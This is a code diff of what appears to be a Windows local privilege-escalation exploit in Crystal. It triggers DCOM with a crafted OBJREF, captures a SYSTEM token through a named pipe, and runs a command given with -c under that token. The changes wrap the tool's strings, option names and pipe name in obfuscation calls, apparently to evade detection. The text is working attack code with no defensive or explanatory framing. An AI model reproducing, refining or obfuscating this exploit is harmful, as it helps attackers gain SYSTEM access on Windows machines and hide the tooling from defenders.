@@ -1062,10 +1851,10 @@ def get_local_objref : ObjRef
     2_u32, Pointer(Void).null, 0_u32)
   raise obf("marshal err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0
 
-  ptr = LibC.GlobalLock(hglobal)
+  ptr = WinExtra.GlobalLock(hglobal)
   data = Bytes.new(4096)
   data.to_unsafe.copy_from(ptr.as(Pointer(UInt8)), 4096)
-  LibC.GlobalUnlock(hglobal)
+  WinExtra.GlobalUnlock(hglobal)
 
   ObjRef.parse(data)
 end
@@ -1095,11 +1884,11 @@ def trigger_dcom(ctx : MyContext)
   data = crafted_objref.get_bytes(crafted_dsa)
   dbg obf("[*] len:") + data.size.to_s
 
-  hglobal = LibC.GlobalAlloc(0x0002_u32, data.size.to_u64)
+  hglobal = WinExtra.GlobalAlloc(0x0002_u32, data.size.to_u64)
   raise obf("alloc err") if hglobal.null?
-  ptr = LibC.GlobalLock(hglobal)
+  ptr = WinExtra.GlobalLock(hglobal)
   ptr.as(Pointer(UInt8)).copy_from(data.to_unsafe, data.size)
-  LibC.GlobalUnlock(hglobal)
+  WinExtra.GlobalUnlock(hglobal)
 
   stream = Pointer(Void).null
   hr = Ole32.CreateStreamOnHGlobal(hglobal, 1, pointerof(stream))
@@ -1116,20 +1905,22 @@ end
 # ─────────────── Main ───────────────────────────────────
 def main
   command = ""
-  pipe_name = "Crystal"
+  pipe_name = obf("Crystal")
 
   OptionParser.parse do |parser|
-    parser.banner = "Usage: main.exe [options]"
-    parser.on("-c CMD", "--cmd=CMD", "Command") { |c| command = c }
-    parser.on("-p NAME", "--pipe=NAME", "Custom pipe name") { |p| pipe_name = p }
-    parser.on("-d", "--debug", "Verbose output") { Config.debug = true }
-    parser.on("-h", "--help", "Show help") { puts parser; exit }
+    parser.banner = obf("Usage: main.exe [options]")
+    parser.on(obf("-c CMD"), obf("--cmd=CMD"), obf("Command")) { |c| command = c }
+    parser.on(obf("-p NAME"), obf("--pipe=NAME"), obf("Pipe name")) { |p| pipe_name = p }
+    parser.on(obf("-d"), obf("--debug"), obf("Debug")) { Config.debug_level = {Config.debug_level + 1, 2}.min }
+    parser.on(obf("-h"), obf("--help"), obf("Help")) { puts parser; exit }
   end
 
   if command.empty?
     STDERR.puts obf("[!] -c required")
     exit(1)
   end
+
+  SysState.init
 
   hr = Ole32.CoInitializeEx(Pointer(Void).null, 0_u32)
   if hr < 0
@@ -1140,7 +1931,7 @@ def main
   begin
     ctx = MyContext.new(pipe_name)
 
-    dbg obf("[*] base:0x") + ctx.combase_module.to_s(16)
+    dbg1 obf("[*] base:0x") + ctx.combase_module.to_s(16)
     dbg obf("[*] dt:0x") + ctx.dispatch_table_ptr.to_s(16)
     dbg obf("[*] fn:0x") + ctx.use_protseq_function_ptr.to_s(16)
     dbg obf("[*] pc:") + ctx.use_protseq_param_count.to_s
@@ -1160,10 +1951,10 @@ def main
 
     system_token = ctx.get_token
     if system_token
-      dbg obf("[*] OK")
+      dbg1 obf("[*] OK")
       create_process_read_output(system_token, command)
     else
-      dbg obf("[!] failed")
+      dbg1 obf("[!] failed")
     end
 
     ctx.restore
